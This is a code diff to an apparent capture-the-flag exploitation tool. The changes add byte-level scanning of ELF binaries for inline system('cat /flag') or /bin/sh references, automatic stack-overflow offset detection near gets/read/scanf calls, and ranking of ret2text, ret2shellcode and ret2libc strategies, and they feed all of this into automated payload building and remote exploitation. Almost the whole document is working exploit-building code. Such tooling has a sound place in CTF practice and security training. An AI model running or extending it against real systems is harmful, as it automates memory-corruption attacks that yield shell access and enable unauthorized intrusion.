@@ -125,6 +125,8 @@ class BinaryAnalyzer:
         self.plt = {}
         self.got = {}
         self.has_libc = False
+        self.cat_flag_gadgets = []  # addresses of 'lea rdi, [cat_flag_str]; ... call system'
+        self.auto_offset = None     # auto-detected overflow offset
         self._load()
 
     def _load(self):
@@ -141,6 +143,8 @@ class BinaryAnalyzer:
             self._analyze_protections()
             self._find_dangerous()
             self._find_win_funcs()
+            self._find_cat_flag_xref()
+            self._auto_detect_offset()
             self._search_gadgets()
             self._extract_strings()
             self._build_plt_got()
@@ -202,6 +206,193 @@ class BinaryAnalyzer:
         # Also check for system() in PLT
         if 'system' in self.elf.plt:
             self.win_funcs.append(('system@plt', self.elf.plt['system']))
+
+    def _find_cat_flag_xref(self):
+        """Find 'lea rdi, [cat_flag_string]' instructions via byte scanning.
+        This detects inline 'system("cat /flag")' calls without needing objdump.
+
+        x86-64: lea rdi, [rip+offset] is encoded as:
+          48 8d 3d XX XX XX XX   (7 bytes, RIP-relative addressing)
+        x86-32: lea rdi, [addr] is:
+          bf XX XX XX XX         (mov edi, imm32)  OR
+          8d 3d XX XX XX XX      (lea edi, [addr])
+        """
+        if not self.elf:
+            return
+
+        # Find "cat flag" related strings in the binary
+        cat_strings = {}
+        search_terms = [b'cat /flag', b'cat flag.txt', b'cat flag', b'/bin/sh',
+                        b'cat /flag.txt', b'sh']
+        for term in search_terms:
+            try:
+                addr = next(self.elf.search(term, writable=False), None)
+                if addr is not None:
+                    cat_strings[addr] = term.decode('ascii', errors='replace')
+            except Exception:
+                pass
+
+        if not cat_strings:
+            return
+
+        # Read the .text section
+        try:
+            text_start = self.elf.get_section_by_name('.text').header.sh_addr
+            text_size = self.elf.get_section_by_name('.text').header.sh_size
+            text_data = self.elf.read(text_start, text_size)
+        except Exception:
+            # Fallback: scan entire binary
+            text_start = 0
+            with open(self.filepath, 'rb') as f:
+                text_data = f.read()
+
+        if self.bits == 64:
+            # x86-64: 48 8d 3d XX XX XX XX  (lea rdi, [rip+offset])
+            # The offset is relative to the NEXT instruction (addr+7)
+            pattern = b'\x48\x8d\x3d'
+            for i in range(len(text_data) - 7):
+                if text_data[i:i+3] == pattern:
+                    instr_addr = text_start + i
+                    # Extract 4-byte signed offset (little-endian)
+                    offset = struct.unpack('<i', text_data[i+3:i+7])[0]
+                    # Target = addr of next instruction + offset
+                    target = instr_addr + 7 + offset
+                    if target in cat_strings:
+                        # Found! Check if there's a call to system nearby
+                        self.cat_flag_gadgets.append({
+                            'addr': instr_addr,
+                            'string': cat_strings[target],
+                            'string_addr': target,
+                            'desc': f'lea rdi, [{cat_strings[target]}] @ {hex(instr_addr)}'
+                        })
+
+            # Also check: mov edi, imm32 (bf XX XX XX XX) for 32-bit addresses
+            for i in range(len(text_data) - 5):
+                if text_data[i] == 0xbf:
+                    instr_addr = text_start + i
+                    target = struct.unpack('<I', text_data[i+1:i+5])[0]
+                    if target in cat_strings:
+                        self.cat_flag_gadgets.append({
+                            'addr': instr_addr,
+                            'string': cat_strings[target],
+                            'string_addr': target,
+                            'desc': f'mov edi, {hex(target)} [{cat_strings[target]}] @ {hex(instr_addr)}'
+                        })
+        else:
+            # x86-32: lea edi, [addr] = 8d 3d XX XX XX XX
+            pattern = b'\x8d\x3d'
+            for i in range(len(text_data) - 6):
+                if text_data[i:i+2] == pattern:
+                    instr_addr = text_start + i
+                    target = struct.unpack('<I', text_data[i+2:i+6])[0]
+                    if target in cat_strings:
+                        self.cat_flag_gadgets.append({
+                            'addr': instr_addr,
+                            'string': cat_strings[target],
+                            'string_addr': target,
+                            'desc': f'lea edi, [{cat_strings[target]}] @ {hex(instr_addr)}'
+                        })
+
+    def _auto_detect_offset(self):
+        """Auto-detect overflow offset by scanning for:
+        lea rdi, [rbp-X]  followed by  call gets/read/scanf
+        Offset = X + 8 (saved rbp) for 64-bit, X + 4 for 32-bit
+
+        x86-64 patterns:
+          48 8d 7d XX   = lea rdi, [rbp+XX]  (XX is signed byte, negative for -X)
+          48 8d bd XX XX XX XX = lea rdi, [rbp+XX32]  (32-bit displacement)
+        """
+        if not self.elf:
+            return
+
+        # Read .text section
+        try:
+            text_start = self.elf.get_section_by_name('.text').header.sh_addr
+            text_size = self.elf.get_section_by_name('.text').header.sh_size
+            text_data = self.elf.read(text_start, text_size)
+        except Exception:
+            return
+
+        # Get addresses of dangerous functions (gets, read, scanf, etc.)
+        vuln_addrs = set()
+        for name, addr in self.dangerous_funcs.items():
+            if name in ('gets', 'read', 'scanf', '__isoc99_scanf',
+                        'strcpy', 'memcpy'):
+                vuln_addrs.add(addr)
+
+        # Also check PLT entries
+        for name in ['gets', 'read', 'scanf', '__isoc99_scanf']:
+            if name in self.plt:
+                vuln_addrs.add(self.plt[name])
+
+        if not vuln_addrs:
+            return
+
+        if self.bits == 64:
+            # Pattern 1: 48 8d 7d XX (lea rdi, [rbp+signed_byte])
+            # Followed within ~10 bytes by: call [vuln_func]
+            for i in range(len(text_data) - 4):
+                if text_data[i:i+3] == b'\x48\x8d\x7d':
+                    disp = struct.unpack('b', text_data[i+3:i+4])[0]  # signed byte
+                    buf_offset = -disp if disp < 0 else disp  # distance from rbp
+
+                    # Look for 'call' within next 15 bytes
+                    call_offset = None
+                    for j in range(4, min(20, len(text_data) - i - 5)):
+                        if text_data[i+j] == 0xe8:  # call rel32
+                            rel32 = struct.unpack('<i', text_data[i+j+1:i+j+5])[0]
+                            call_target = text_start + i + j + 5 + rel32
+                            if call_target in vuln_addrs:
+                                call_offset = j
+                                break
+                        # Also check: call [rax] = ff d0, call rax = ff d0
+                        # or ff 15 (call [rip+ofs]) for PLT calls
+                        if text_data[i+j] == 0xff:
+                            if j + 1 < len(text_data) - i:
+                                modrm = text_data[i+j+1]
+                                # call [rip+disp32] = ff 15 XX XX XX XX
+                                if modrm == 0x15 and j + 5 < len(text_data) - i:
+                                    rel32 = struct.unpack('<i', text_data[i+j+2:i+j+6])[0]
+                                    call_target = text_start + i + j + 6 + rel32
+                                    if call_target in vuln_addrs:
+                                        call_offset = j
+                                        break
+
+                    if call_offset is not None:
+                        offset = buf_offset + 8  # +8 for saved rbp (64-bit)
+                        self.auto_offset = offset
+                        return
+
+            # Pattern 2: 48 8d bd XX XX XX XX (lea rdi, [rbp+disp32])
+            for i in range(len(text_data) - 7):
+                if text_data[i:i+3] == b'\x48\x8d\xbd':
+                    disp = struct.unpack('<i', text_data[i+3:i+7])[0]
+                    buf_offset = -disp if disp < 0 else disp
+
+                    for j in range(7, min(24, len(text_data) - i - 5)):
+                        if text_data[i+j] == 0xe8:
+                            rel32 = struct.unpack('<i', text_data[i+j+1:i+j+5])[0]
+                            call_target = text_start + i + j + 5 + rel32
+                            if call_target in vuln_addrs:
+                                offset = buf_offset + 8
+                                self.auto_offset = offset
+                                return
+
+            # Pattern 3: 48 8d 45 XX (lea rax, [rbp+byte]) + mov rdi,rax + call vuln
+            # Common when compiler uses lea rax; mov rdi, rax instead of lea rdi
+            for i in range(len(text_data) - 4):
+                if text_data[i:i+3] == b'\x48\x8d\x45':
+                    disp = struct.unpack('b', text_data[i+3:i+4])[0]
+                    buf_offset = -disp if disp < 0 else disp
+
+                    for j in range(4, min(25, len(text_data) - i - 5)):
+                        if text_data[i+j] == 0xe8:
+                            rel32 = struct.unpack('<i', text_data[i+j+1:i+j+5])[0]
+                            call_target = text_start + i + j + 5 + rel32
+                            if call_target in vuln_addrs:
+                                offset = buf_offset + 8
+                                self.auto_offset = offset
+                                return
 
     def _search_gadgets(self):
         """Search for ROP gadgets using pwntools ROP."""
@@ -294,6 +485,17 @@ class BinaryAnalyzer:
             lines.append(C.sub(f"Win/Backdoor functions ({len(self.win_funcs)})"))
             for name, addr in self.win_funcs:
                 lines.append(f"    {C.GRN}{name}{C.RST}: {hex(addr)}")
+
+        # Cat flag gadgets (inline system("cat /flag") detection)
+        if self.cat_flag_gadgets:
+            lines.append(C.sub(f"Cat-flag gadgets ({len(self.cat_flag_gadgets)})"))
+            for g in self.cat_flag_gadgets:
+                lines.append(f"    {C.GRN}{g['desc']}{C.RST}")
+
+        # Auto-detected offset
+        if self.auto_offset:
+            lines.append(C.sub("Auto-detected overflow offset"))
+            lines.append(f"    {C.GRN}{self.auto_offset}{C.RST} bytes (from lea rdi,[rbp-X] + call gets/read/scanf)")
 
         # PLT
         if self.plt:
@@ -517,14 +719,14 @@ class ExploitBuilder:
         # Find /bin/sh string in binary
         binsh_addr = None
         try:
-            binsh_addr = next(elf.search(b'/bin/sh\x00'))
+            binsh_addr = next(elf.search(b'/bin/sh\x00'), None)
         except (StopIteration, Exception):
             pass
 
         if binsh_addr is None:
             # Try to find /bin/sh without null
             try:
-                binsh_addr = next(elf.search(b'/bin/sh'))
+                binsh_addr = next(elf.search(b'/bin/sh'), None)
             except (StopIteration, Exception):
                 pass
 
@@ -784,20 +986,41 @@ class PWNArcanum:
         a = self.analyzer
         recommendations = []
 
+        # Check for cat-flag gadgets -> highest priority ret2text
+        if a.cat_flag_gadgets:
+            for g in a.cat_flag_gadgets:
+                recommendations.append(('ret2text', 95,
+                    f"Found inline system(\"{g['string']}\") at {hex(g['addr'])}"))
+
         # Check for win function -> ret2text
         if a.win_funcs:
             for name, addr in a.win_funcs:
-                if 'system' not in name.lower():
+                if 'system' not in name.lower() and 'got.' not in name.lower() and 'plt.' not in name.lower():
                     recommendations.append(('ret2text', 90,
                         f"Found win function: {name} at {hex(addr)}"))
 
+        # Also: system@plt + pop rdi + cat_flag string = ret2text with args
+        has_system_plt = 'system' in a.plt
+        has_pop_rdi = any(g[0] == 'pop rdi; ret' for g in a.gadgets)
+        if has_system_plt and has_pop_rdi:
+            # Check if there's a /bin/sh or cat flag string
+            has_binsh = False
+            try:
+                if a.elf:
+                    next(a.elf.search(b'/bin/sh'))
+                    has_binsh = True
+            except (StopIteration, Exception):
+                pass
+            if has_binsh:
+                recommendations.append(('ret2text', 85,
+                    "system@plt + pop rdi + /bin/sh -> system(\"/bin/sh\")"))
+
         # Check NX status
         nx_enabled = a.protections.get('NX', False)
-        canary = a.protections.get('Canary', False)
 
         # If NX disabled -> ret2shellcode
         if not nx_enabled:
-            recommendations.append(('ret2shellcode', 80,
+            recommendations.append(('ret2shellcode', 75,
                 "NX disabled, shellcode on stack might work"))
 
         # Check for ROP gadgets -> ret2syscall
@@ -808,10 +1031,9 @@ class PWNArcanum:
                 needed = ['pop rdi; ret', 'pop rsi; ret',
                           'pop rdx; ret', 'syscall']
             else:
-                needed = ['int 0x80']  # simplified
+                needed = ['int 0x80']
             found = [g for g in needed if g in gadget_names]
             if len(found) >= 3:
-                # Check for /bin/sh
                 try:
                     if a.elf and next(a.elf.search(b'/bin/sh'), None):
                         recommendations.append(('ret2syscall', 70,
@@ -821,7 +1043,6 @@ class PWNArcanum:
         # ret2libc if we have PLT leak function + pop rdi
         if a.plt and a.got:
             has_leak = any(n in a.plt for n in ['puts', 'printf', 'write'])
-            has_pop_rdi = any(g[0] == 'pop rdi; ret' for g in a.gadgets)
             if has_leak and has_pop_rdi:
                 recommendations.append(('ret2libc', 60,
                     "Has leak function + pop rdi gadget"))
@@ -837,9 +1058,14 @@ class PWNArcanum:
     def build_payload(self, strategy='auto', offset=None, win_func=None,
                       shellcode_addr=None, args=None):
         """Build exploit payload for the given strategy."""
+        # Use auto-detected offset if not specified
         if offset is None:
-            print(C.warn("No offset specified, using default 112"))
-            offset = 112
+            if self.analyzer.auto_offset:
+                offset = self.analyzer.auto_offset
+                print(C.hit(f"Auto-detected offset: {offset} bytes"))
+            else:
+                print(C.warn("No offset specified, using default 112"))
+                offset = 112
         self.offset = offset
 
         if strategy == 'auto':
@@ -855,8 +1081,15 @@ class PWNArcanum:
         print(C.info(f"Building payload: strategy={strategy}, offset={offset}"))
 
         if strategy == 'ret2text':
-            payload, desc = self.builder.ret2text(
-                offset, win_name=win_func, args=args)
+            # If we found cat-flag gadgets and no explicit win_func, use the gadget addr
+            if not win_func and self.analyzer.cat_flag_gadgets:
+                gadget_addr = self.analyzer.cat_flag_gadgets[0]['addr']
+                payload, desc = self.builder.ret2text(
+                    offset, win_addr=gadget_addr,
+                    win_name=f'cat_flag_gadget@{hex(gadget_addr)}', args=args)
+            else:
+                payload, desc = self.builder.ret2text(
+                    offset, win_name=win_func, args=args)
         elif strategy == 'ret2shellcode':
             payload, desc = self.builder.ret2shellcode(
                 offset, shellcode_addr=shellcode_addr)
@@ -1205,13 +1438,16 @@ Strategies:
     # Step 4: Exploit
     if args.dump:
         print(C.info("--dump specified, skipping remote connection"))
-        # Save payload to file
-        payload_file = os.path.join(
-            os.path.dirname(args.binary) or '.',
-            'payload.bin')
-        with open(payload_file, 'wb') as f:
-            f.write(payload)
-        print(C.hit(f"Payload saved to {payload_file}"))
+        if payload is None:
+            print(C.err("No payload generated, cannot save. Check strategy/offset."))
+        else:
+            # Save payload to file
+            payload_file = os.path.join(
+                os.path.dirname(args.binary) or '.',
+                'payload.bin')
+            with open(payload_file, 'wb') as f:
+                f.write(payload)
+            print(C.hit(f"Payload saved to {payload_file}"))
     elif host and port:
         print(C.hdr("STEP 4: REMOTE EXPLOITATION"))
         if libc_offsets:
